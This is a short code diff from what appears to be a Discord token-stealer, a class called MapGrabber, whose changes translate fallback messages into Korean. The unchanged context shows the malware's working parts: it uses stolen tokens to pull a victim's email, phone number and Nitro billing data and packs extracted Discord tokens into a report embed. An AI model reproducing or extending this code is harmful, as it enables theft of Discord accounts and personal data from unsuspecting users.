@@ -425,7 +425,7 @@ class MapGrabber(functions):
                 badges = "None"
             email = j.get("email")
             phone = j.get("phone") if j.get(
-                "phone") else "No Phone Number attached"
+                "phone") else "핸드폰 번호가 감지되지 않습니다!"
             nitro_data = httpx.get(
                 self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
             has_nitro = False
@@ -549,7 +549,7 @@ class MapGrabber(functions):
                         {
                             'name': '**디스코드 토큰들:**',
                             'value': f'''```yaml
-                                {tokens if tokens else "No tokens extracted"}```
+                                {tokens if tokens else "토큰이 감지되지 않습니다!"}```
                             '''.replace(' ', ''),
                             'inline': False
                         },
